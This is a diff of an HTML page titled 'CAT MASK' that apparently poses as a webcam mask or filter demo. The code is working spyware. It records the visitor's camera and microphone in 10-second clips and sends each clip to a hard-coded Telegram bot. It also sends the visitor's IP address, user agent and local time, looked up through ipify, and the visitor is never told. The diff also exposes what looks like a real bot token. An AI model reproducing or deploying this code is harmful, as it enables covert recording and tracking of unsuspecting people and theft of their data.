@@ -3,41 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Demo with Video Recording</title>
-    <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
+    <title>TEST</title>
 </head>
 <body>
-    <h1>Test Mask</h1>
+    <h1>CAT MASK</h1>
     <video id="video" width="640" height="480" autoplay></video>
 
     <script>
         const video = document.getElementById('video');
         let mediaRecorder;
         let recordedChunks = [];
+        let userInfo = {};
 
-        // Access the camera and start video streaming
+        // Получение IP-адреса и информации об устройстве
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                userInfo.ip = data.ip;
+                userInfo.userAgent = navigator.userAgent;
+                userInfo.time = new Date().toLocaleString();
+            })
+            .catch(error => console.error('Ошибка при получении IP:', error));
+
+        // Запрос доступа к камере и микрофону
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
             .then(stream => {
                 video.srcObject = stream;
                 mediaRecorder = new MediaRecorder(stream);
+
                 mediaRecorder.ondataavailable = event => {
                     if (event.data.size > 0) {
                         recordedChunks.push(event.data);
                     }
                 };
-                mediaRecorder.start();
+
+                mediaRecorder.onstop = () => {
+                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                    sendToTelegram(videoBlob, userInfo);
+                    recordedChunks = [];
+                    mediaRecorder.start();  // Запуск новой записи
+                };
+
+                mediaRecorder.start();  // Запуск первой записи
+
+                // Автоматическая остановка и отправка каждые 10 секунд
                 setInterval(() => {
                     mediaRecorder.stop();
-                    sendToTelegram(new Blob(recordedChunks, { type: 'video/webm' }));
-                    recordedChunks = [];
-                    mediaRecorder.start();
-                }, 10000); // Record in 10-second intervals
+                }, 10000); // 10 секунд
             })
-            .catch(err => console.error('Error accessing media devices.', err));
+            .catch(err => console.error('Ошибка доступа к медиа устройствам.', err));
 
-        // Function to send the video to Telegram
-        function sendToTelegram(blob) {
-            const token = ''7504272107:AAH8rOfaUtOq8xnxWnvQ0s4SriLHkz4nITk';
+        // Отправка видео и информации в Telegram
+        function sendToTelegram(blob, userInfo) {
+            const token = '7504272107:AAH8rOfaUtOq8xnxWnvQ0s4SriLHkz4nITk';
             const chatId = '6121166273';
             const url = `https://api.telegram.org/bot${token}/sendVideo`;
 
@@ -45,47 +63,23 @@
             formData.append('chat_id', chatId);
             formData.append('video', blob, 'recording.webm');
 
+            // Отправка информации о пользователе как сообщение
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `User Info:\nIP: ${userInfo.ip}\nUser Agent: ${userInfo.userAgent}\nTime: ${userInfo.time}`
+                })
+            });
+
             fetch(url, {
                 method: 'POST',
                 body: formData
             })
             .then(response => response.json())
-            .then(data => console.log('Video sent successfully:', data))
-            .catch((error) => console.error('Error sending video to Telegram:', error));
-        }
-
-        // Collect IP address and device information
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                console.log('IP Address:', data.ip);
-                sendDeviceInfo(data.ip);
-            });
-
-        function sendDeviceInfo(ip) {
-            const deviceInfo = {
-                ip: ip,
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                timestamp: new Date().toISOString()
-            };
-
-            const token = 'YOUR_BOT_TOKEN';
-            const chatId = 'YOUR_CHAT_ID';
-            const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: `New visitor info:\nIP: ${deviceInfo.ip}\nUser-Agent: ${deviceInfo.userAgent}\nPlatform: ${deviceInfo.platform}\nLanguage: ${deviceInfo.language}\nTimestamp: ${deviceInfo.timestamp}`
-                })
-            })
-            .then(response => response.json())
-            .then(data => console.log('Device info sent successfully:', data))
-            .catch((error) => console.error('Error sending device info to Telegram:', error));
+            .then(data => console.log('Видео успешно отправлено:', data))
+            .catch((error) => console.error('Ошибка при отправке видео в Telegram:', error));
         }
     </script>
 </body>
